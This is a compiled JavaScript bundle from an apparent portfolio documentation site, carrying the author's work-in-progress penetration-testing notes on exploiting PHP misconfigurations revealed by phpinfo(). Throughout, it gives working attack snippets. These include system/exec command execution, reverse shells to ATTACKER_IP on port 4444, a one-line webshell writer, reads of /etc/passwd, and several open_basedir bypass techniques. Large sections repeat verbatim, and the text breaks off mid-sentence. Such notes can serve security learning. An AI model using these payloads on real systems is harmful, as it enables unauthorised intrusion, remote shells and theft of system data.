"use strict";(globalThis.webpackChunkportfolio=globalThis.webpackChunkportfolio||[]).push([[1812],{8453:(e,s,n)=>{n.d(s,{R:()=>c,x:()=>o});var i=n(6540);const r={},l=i.createContext(r);function c(e){const s=i.useContext(l);return i.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function o(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),i.createElement(l.Provider,{value:s},e.children)}},9405:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>d,contentTitle:()=>o,default:()=>a,frontMatter:()=>c,metadata:()=>i,toc:()=>t});const i=JSON.parse('{"id":"procedure/phpinfo","title":"phpinfo","description":"check for exposed database credentials [WIP, how to check, check which keywords]","source":"@site/docs/procedure/phpinfo.md","sourceDirName":"procedure","slug":"/procedure/phpinfo","permalink":"/portfolio/docs/procedure/phpinfo","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedAt":1765120889000,"frontMatter":{},"sidebar":"docsSidebar","previous":{"title":"Wordpress","permalink":"/portfolio/docs/procedure/Wordpress"},"next":{"title":"General","permalink":"/portfolio/docs/category/general"}}');var r=n(4848),l=n(8453);const c={},o=void 0,d={},t=[{value:"Section: Core",id:"section-core",level:2},{value:"disable_functions",id:"disable_functions",level:3},{value:"<strong>How to Abuse Unrestricted Functions?</strong>",id:"how-to-abuse-unrestricted-functions",level:3},{value:"<strong>1. Direct Command Execution (If You Can Execute PHP)</strong>",id:"1-direct-command-execution-if-you-can-execute-php",level:3},{value:"<strong>2. Reverse Shell (If You Have Code Execution)</strong>",id:"2-reverse-shell-if-you-have-code-execution",level:3},{value:"<strong>3. File Read/Write (If You Need Data Exfiltration)</strong>",id:"3-file-readwrite-if-you-need-data-exfiltration",level:3},{value:"<strong>4. Bypassing Additional Restrictions</strong>",id:"4-bypassing-additional-restrictions",level:3},{value:"<strong>Common Attack Vectors to Gain Initial Execution</strong>",id:"common-attack-vectors-to-gain-initial-execution",level:3},{value:"open_basedir",id:"open_basedir",level:3},{value:"<strong>2. Testing for Misconfigurations</strong>",id:"2-testing-for-misconfigurations",level:2},{value:"<strong>A. Using PHP to Check Access</strong>",id:"a-using-php-to-check-access",level:3},{value:"<strong>B. Common Misconfigurations</strong>",id:"b-common-misconfigurations",level:3},{value:"<strong>3. Bypassing\xa0<code>open_basedir</code>\xa0(If Misconfigured)</strong>",id:"3-bypassingopen_basedirif-misconfigured",level:2},{value:"<strong>A. Using\xa0<code>symlink()</code>\xa0(Race Condition)</strong>",id:"a-usingsymlinkrace-condition",level:3},{value:"<strong>B. Using\xa0<code>glob://</code>\xa0(Directory Browsing)</strong>",id:"b-usingglobdirectory-browsing",level:3},{value:"<strong>C. Using\xa0<code>chdir()</code>\xa0+\xa0<code>ini_set()</code>\xa0Trick</strong>",id:"c-usingchdirini_settrick",level:3},{value:"<strong>D. Using\xa0<code>SplFileObject</code>\xa0(PHP 5.3+)</strong>",id:"d-usingsplfileobjectphp-53",level:3},{value:"<strong>1. Checking\xa0<code>open_basedir</code>\xa0in\xa0<code>phpinfo()</code></strong>",id:"1-checkingopen_basedirinphpinfo",level:2},{value:"<strong>2. Testing for Misconfigurations</strong>",id:"2-testing-for-misconfigurations-1",level:2},{value:"<strong>A. Using PHP to Check Access</strong>",id:"a-using-php-to-check-access-1",level:3},{value:"<strong>B. Common Misconfigurations</strong>",id:"b-common-misconfigurations-1",level:3},{value:"<strong>3. Bypassing\xa0<code>open_basedir</code>\xa0(If Misconfigured)</strong>",id:"3-bypassingopen_basedirif-misconfigured-1",level:2},{value:"<strong>A. Using\xa0<code>symlink()</code>\xa0(Race Condition)</strong>",id:"a-usingsymlinkrace-condition-1",level:3},{value:"<strong>B. Using\xa0<code>glob://</code>\xa0(Directory Browsing)</strong>",id:"b-usingglobdirectory-browsing-1",level:3},{value:"<strong>C. Using\xa0<code>chdir()</code>\xa0+\xa0<code>ini_set()</code>\xa0Trick</strong>",id:"c-usingchdirini_settrick-1",level:3},{value:"<strong>D. Using\xa0<code>SplFileObject</code>\xa0(PHP 5.3+)</strong>",id:"d-usingsplfileobjectphp-53-1",level:3},{value:"allow_url_include &amp; allow_url_fopen",id:"allow_url_include--allow_url_fopen",level:3},{value:"<strong>1. Checking\xa0<code>open_basedir</code>\xa0in\xa0<code>phpinfo()</code></strong>",id:"1-checkingopen_basedirinphpinfo-1",level:2},{value:"<strong>2. Testing for Misconfigurations</strong>",id:"2-testing-for-misconfigurations-2",level:2},{value:"<strong>A. Using PHP to Check Access</strong>",id:"a-using-php-to-check-access-2",level:3},{value:"<strong>B. Common Misconfigurations</strong>",id:"b-common-misconfigurations-2",level:3},{value:"<strong>3. Bypassing\xa0<code>open_basedir</code>\xa0(If Misconfigured)</strong>",id:"3-bypassingopen_basedirif-misconfigured-2",level:2},{value:"<strong>A. Using\xa0<code>symlink()</code>\xa0(Race Condition)</strong>",id:"a-usingsymlinkrace-condition-2",level:3},{value:"<strong>B. Using\xa0<code>glob://</code>\xa0(Directory Browsing)</strong>",id:"b-usingglobdirectory-browsing-2",level:3},{value:"<strong>C. Using\xa0<code>chdir()</code>\xa0+\xa0<code>ini_set()</code>\xa0Trick</strong>",id:"c-usingchdirini_settrick-2",level:3},{value:"<strong>D. Using\xa0<code>SplFileObject</code>\xa0(PHP 5.3+)</strong>",id:"d-usingsplfileobjectphp-53-2",level:3}];function h(e){const s={code:"code",em:"em",h2:"h2",h3:"h3",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components},{Details:n}=s;return n||function(e,s){throw new Error("Expected "+(s?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.p,{children:"check for exposed database credentials [WIP, how to check, check which keywords]"}),"\n",(0,r.jsx)(s.p,{children:"SPX: lookout if under SPX section http_key is shown or smth idk how SPX works. maybe needs ip_whitelist to be * and http_enabled to be 1"}),"\n",(0,r.jsx)(s.p,{children:"Apache Environment: check for DOCUMENT_ROOT or include_path in other applications for directory traversal attacks [WIP, be more specific]"}),"\n",(0,r.jsx)(s.p,{children:"check for outdated apache, nginx, FFI, imagemagick, xsl, sql or database versions. update any found software versions into software and veriosn list"}),"\n",(0,r.jsx)(s.h2,{id:"section-core",children:"Section: Core"}),"\n",(0,r.jsxs)(n,{children:[(0,r.jsx)(s.p,{children:"if u can inject PHP or hv unsanitised user input:"}),(0,r.jsx)(s.p,{children:"some backdoors available at usr/share/webshells/php"}),(0,r.jsx)(s.h3,{id:"disable_functions",children:"disable_functions"}),(0,r.jsxs)(n,{children:[(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"disable_functions"})}),"\xa0in\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"phpinfo()"})}),"\xa0shows\xa0",(0,r.jsx)(s.strong,{children:'"no value"'}),", it means\xa0",(0,r.jsx)(s.strong,{children:"no functions are disabled"}),", and\xa0",(0,r.jsxs)(s.strong,{children:["dangerous functions (like\xa0",(0,r.jsx)(s.code,{children:"exec"}),",\xa0",(0,r.jsx)(s.code,{children:"system"}),",\xa0",(0,r.jsx)(s.code,{children:"shell_exec"}),",\xa0",(0,r.jsx)(s.code,{children:"passthru"}),", etc.) are fully available"]}),". This is a serious misconfiguration that can lead to\xa0",(0,r.jsx)(s.strong,{children:"Remote Code Execution (RCE)"}),"\xa0if an attacker finds a way to inject and execute PHP code."]}),(0,r.jsx)(s.hr,{}),(0,r.jsx)(s.h3,{id:"how-to-abuse-unrestricted-functions",children:(0,r.jsx)(s.strong,{children:"How to Abuse Unrestricted Functions?"})}),(0,r.jsx)(s.p,{children:"Since no functions are disabled, you can exploit them in several ways:"}),(0,r.jsx)(s.h3,{id:"1-direct-command-execution-if-you-can-execute-php",children:(0,r.jsx)(s.strong,{children:"1. Direct Command Execution (If You Can Execute PHP)"})}),(0,r.jsxs)(s.p,{children:["If you find a way to inject PHP (e.g., via file upload, LFI, or unsafe\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"eval()"})}),"), you can run system commands:"]}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:'<?php\r\nsystem("id");           // Runs \'id\' and prints output\r\necho exec("whoami");    // Runs \'whoami\' and returns output\r\nshell_exec("ls -la");   // Executes command (silent unless printed)\r\npassthru("uname -a");   // Directly outputs command result\r\n?>\n'})}),(0,r.jsx)(s.p,{children:(0,r.jsx)(s.strong,{children:"Example Exploits:"})}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"File Upload Bypass"}),"\xa0(Upload\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:".php"})}),"\xa0with malicious code)"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"LFI to RCE"}),"\xa0(Log poisoning,\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/proc/self/environ"})}),"\xa0manipulation)"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsxs)(s.strong,{children:["Unsafe\xa0",(0,r.jsx)(s.code,{children:"eval()"})]}),"\xa0(If user input reaches\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"eval()"})}),")"]}),"\n"]}),(0,r.jsx)(s.h3,{id:"2-reverse-shell-if-you-have-code-execution",children:(0,r.jsx)(s.strong,{children:"2. Reverse Shell (If You Have Code Execution)"})}),(0,r.jsx)(s.p,{children:"If you can execute commands, spawn a reverse shell:"}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:'<?php\r\n$sock = fsockopen("ATTACKER_IP", 4444);\r\nexec("/bin/sh -i <&3 >&3 2>&3");  // Classic Bash reverse shell\r\n?>\n'})}),(0,r.jsx)(s.p,{children:(0,r.jsx)(s.strong,{children:"Alternative Shell Methods:"})}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"PHP one-liner reverse shell"}),":"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php system(\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\"); ?>\n"})}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"Python/PHP/Perl alternatives"}),"\xa0if Bash is restricted."]}),"\n"]}),"\n"]}),(0,r.jsx)(s.h3,{id:"3-file-readwrite-if-you-need-data-exfiltration",children:(0,r.jsx)(s.strong,{children:"3. File Read/Write (If You Need Data Exfiltration)"})}),(0,r.jsx)(s.p,{children:"Read sensitive files:"}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:'<?php\r\necho file_get_contents("/etc/passwd");   // Read system files\r\nfile_put_contents("shell.php", "<?php system(\\$_GET[\'cmd\']); ?>"); // Write a webshell\r\n?>\n'})}),(0,r.jsx)(s.h3,{id:"4-bypassing-additional-restrictions",children:(0,r.jsx)(s.strong,{children:"4. Bypassing Additional Restrictions"})}),(0,r.jsxs)(s.p,{children:["Even if\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"disable_functions"})}),"\xa0is empty, check for:"]}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0(limits file access to certain directories)"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"safe_mode"})}),"\xa0(deprecated, but may still be enabled)"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"SELinux/AppArmor"}),"\xa0(kernel-level restrictions)"]}),"\n"]}),(0,r.jsx)(s.hr,{}),(0,r.jsx)(s.h3,{id:"common-attack-vectors-to-gain-initial-execution",children:(0,r.jsx)(s.strong,{children:"Common Attack Vectors to Gain Initial Execution"})}),(0,r.jsxs)(s.p,{children:["Since\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"phpinfo()"})}),"\xa0itself doesn\u2019t execute code, you need another way to run PHP commands. Look for:"]}),(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"File Upload Vulnerabilities"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Upload a\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:".php"})}),"\xa0file (e.g., disguised as an image)."]}),"\n",(0,r.jsxs)(s.li,{children:["Try null-byte tricks (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"shell.php%00.jpg"})}),"\xa0in old PHP versions)."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Local File Inclusion (LFI) \u2192 RCE"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Include log files (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/log/apache2/access.log"})}),") and inject PHP via User-Agent."]}),"\n",(0,r.jsxs)(s.li,{children:["Poison\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"PHPSESSID"})}),"\xa0or other writable files."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Unserialize() Exploits"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["If the app uses\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"unserialize()"})}),", exploit it for RCE (e.g., via\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"phar://"})}),"\xa0deserialization)."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"SQL Injection \u2192 Write Webshell"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["If the DB has file-write privileges (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"SELECT ... INTO OUTFILE '/var/www/shell.php'"})}),")."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"XXE (XML External Entity) Attacks"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["If PHP\u2019s\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"libxml_disable_entity_loader"})}),"\xa0is off, read files via XXE."]}),"\n"]}),"\n"]}),"\n"]})]}),(0,r.jsx)(s.h3,{id:"open_basedir",children:"open_basedir"}),(0,r.jsxs)(n,{children:[(0,r.jsxs)(s.p,{children:["Look for\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0in the PHP configuration section."]}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:"empty"}),"\xa0\u2192 No restrictions (full filesystem access)."]}),"\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:"set but incorrect"}),"\xa0\u2192 Possible bypasses."]}),"\n"]}),(0,r.jsxs)(s.p,{children:["Example from\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"phpinfo()"})}),":"]}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"Directive           Local Value  Master Value\r\nopen_basedir       /var/www/html  /var/www/html\n"})}),(0,r.jsxs)(s.p,{children:["This means PHP scripts can\xa0",(0,r.jsx)(s.strong,{children:"only"}),"\xa0access files inside\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/html"})}),"."]}),(0,r.jsx)(s.hr,{}),(0,r.jsx)(s.h2,{id:"2-testing-for-misconfigurations",children:(0,r.jsx)(s.strong,{children:"2. Testing for Misconfigurations"})}),(0,r.jsx)(s.h3,{id:"a-using-php-to-check-access",children:(0,r.jsx)(s.strong,{children:"A. Using PHP to Check Access"})}),(0,r.jsx)(s.p,{children:"Try reading files outside the allowed path:"}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n// Attempt to read /etc/passwd\r\necho file_get_contents('/etc/passwd');\r\n?>\n"})}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"If successful"}),"\xa0\u2192\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is\xa0",(0,r.jsx)(s.strong,{children:"not enforced"}),"\xa0or misconfigured."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"If blocked"}),"\xa0\u2192\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is working (but may still be bypassable)."]}),"\n"]}),(0,r.jsx)(s.h3,{id:"b-common-misconfigurations",children:(0,r.jsx)(s.strong,{children:"B. Common Misconfigurations"})}),(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Multiple Paths Without Proper Separation"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Example:\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html:/tmp"})})]}),"\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/tmp"})}),"\xa0is writable, upload a malicious PHP file there and include it."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Missing Trailing Slash"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Bad"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["May allow accessing\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/html_secret"})}),"\xa0if it exists."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Good"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html/"})}),"\xa0(trailing slash restricts strictly)."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Wildcard Misuse"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Bad"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/*"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Might allow escaping via path traversal (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/../etc/passwd"})}),")."]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),(0,r.jsx)(s.hr,{}),(0,r.jsx)(s.h2,{id:"3-bypassingopen_basedirif-misconfigured",children:(0,r.jsxs)(s.strong,{children:["3. Bypassing\xa0",(0,r.jsx)(s.code,{children:"open_basedir"}),"\xa0(If Misconfigured)"]})}),(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is set but weak, try these bypasses:"]}),(0,r.jsx)(s.h3,{id:"a-usingsymlinkrace-condition",children:(0,r.jsxs)(s.strong,{children:["A. Using\xa0",(0,r.jsx)(s.code,{children:"symlink()"}),"\xa0(Race Condition)"]})}),(0,r.jsx)(s.p,{children:"If you can create symlinks, you may escape:"}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\nmkdir('exploit');\r\nchdir('exploit');\r\nmkdir('traversed');\r\nchdir('traversed');\r\nsymlink('../../../../etc/passwd', 'link');\r\nchdir('..');\r\nsymlink('exploit/traversed/link', 'bypass');\r\necho file_get_contents('bypass');\r\n?>\n"})}),(0,r.jsx)(s.p,{children:(0,r.jsxs)(s.em,{children:["(Works on some PHP versions when\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"symlink"})}),"\xa0is allowed.)"]})}),(0,r.jsx)(s.h3,{id:"b-usingglobdirectory-browsing",children:(0,r.jsxs)(s.strong,{children:["B. Using\xa0",(0,r.jsx)(s.code,{children:"glob://"}),"\xa0(Directory Browsing)"]})}),(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0blocks\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"file_get_contents()"})}),", try:"]}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n$files = glob('/*');\r\nprint_r($files);  // Lists root dir files\r\n?>\n"})}),(0,r.jsx)(s.h3,{id:"c-usingchdirini_settrick",children:(0,r.jsxs)(s.strong,{children:["C. Using\xa0",(0,r.jsx)(s.code,{children:"chdir()"}),"\xa0+\xa0",(0,r.jsx)(s.code,{children:"ini_set()"}),"\xa0Trick"]})}),(0,r.jsx)(s.p,{children:"Some PHP versions allow:"}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\nmkdir('exploit');\r\nchdir('exploit');\r\nini_set('open_basedir', '..');\r\nchdir('..'); chdir('..'); chdir('..');\r\nini_set('open_basedir', '/');\r\necho file_get_contents('/etc/passwd');\r\n?>\n"})}),(0,r.jsx)(s.p,{children:(0,r.jsxs)(s.em,{children:["(Depends on PHP version and\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"disable_functions"})}),".)"]})}),(0,r.jsx)(s.h3,{id:"d-usingsplfileobjectphp-53",children:(0,r.jsxs)(s.strong,{children:["D. Using\xa0",(0,r.jsx)(s.code,{children:"SplFileObject"}),"\xa0(PHP 5.3+)"]})}),(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"SplFileObject"})}),"\xa0is available:"]}),(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n$file = new SplFileObject('/etc/passwd');\r\necho $file->fread($file->getSize());\r\n?>\n"})}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsx)(s.p,{children:"Core"}),"\n",(0,r.jsx)(s.h2,{id:"1-checkingopen_basedirinphpinfo",children:(0,r.jsxs)(s.strong,{children:["1. Checking\xa0",(0,r.jsx)(s.code,{children:"open_basedir"}),"\xa0in\xa0",(0,r.jsx)(s.code,{children:"phpinfo()"})]})}),"\n",(0,r.jsxs)(s.p,{children:["Look for\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0in the PHP configuration section."]}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:"empty"}),"\xa0\u2192 No restrictions (full filesystem access)."]}),"\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:"set but incorrect"}),"\xa0\u2192 Possible bypasses."]}),"\n"]}),"\n",(0,r.jsxs)(s.p,{children:["Example from\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"phpinfo()"})}),":"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"Directive           Local Value  Master Value\r\nopen_basedir       /var/www/html  /var/www/html\n"})}),"\n",(0,r.jsxs)(s.p,{children:["This means PHP scripts can\xa0",(0,r.jsx)(s.strong,{children:"only"}),"\xa0access files inside\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/html"})}),"."]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"2-testing-for-misconfigurations-1",children:(0,r.jsx)(s.strong,{children:"2. Testing for Misconfigurations"})}),"\n",(0,r.jsx)(s.h3,{id:"a-using-php-to-check-access-1",children:(0,r.jsx)(s.strong,{children:"A. Using PHP to Check Access"})}),"\n",(0,r.jsx)(s.p,{children:"Try reading files outside the allowed path:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\n// Attempt to read /etc/passwd\r\necho file_get_contents('/etc/passwd');\r\n?>\n"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"If successful"}),"\xa0\u2192\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is\xa0",(0,r.jsx)(s.strong,{children:"not enforced"}),"\xa0or misconfigured."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"If blocked"}),"\xa0\u2192\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is working (but may still be bypassable)."]}),"\n"]}),"\n",(0,r.jsx)(s.h3,{id:"b-common-misconfigurations-1",children:(0,r.jsx)(s.strong,{children:"B. Common Misconfigurations"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Multiple Paths Without Proper Separation"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Example:\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html:/tmp"})})]}),"\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/tmp"})}),"\xa0is writable, upload a malicious PHP file there and include it."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Missing Trailing Slash"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Bad"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["May allow accessing\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/html_secret"})}),"\xa0if it exists."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Good"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/html/"})}),"\xa0(trailing slash restricts strictly)."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Wildcard Misuse"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Bad"}),":\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir = /var/www/*"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Might allow escaping via path traversal (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/www/../etc/passwd"})}),")."]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"3-bypassingopen_basedirif-misconfigured-1",children:(0,r.jsxs)(s.strong,{children:["3. Bypassing\xa0",(0,r.jsx)(s.code,{children:"open_basedir"}),"\xa0(If Misconfigured)"]})}),"\n",(0,r.jsxs)(s.p,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"open_basedir"})}),"\xa0is set but weak, try these bypasses:"]}),"\n",(0,r.jsx)(s.h3,{id:"a-usingsymlinkrace-condition-1",children:(0,r.jsxs)(s.strong,{children:["A. Using\xa0",(0,r.jsx)(s.code,{children:"symlink()"}),"\xa0(Race Condition)"]})}),"\n",(0,r.jsx)(s.p,{children:"If you can create symlinks, you may escape:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-php",children:"<?php\r\nmkdir('exploit');\r\nchdir('exploit');\r\nmkdir('traversed');\r\nchdir('traversed');\r\nsymlink('../../../../etc/passwd', 'link');\r\nchdir('..');\r\nsymlink('exploit/traversed/link', 'bypass');\r\necho file_get_contents('bypass');\r\n?>\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsxs)(s.em,{children:["(Works on some PHP versions when\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"symlink"})}),"\xa0is 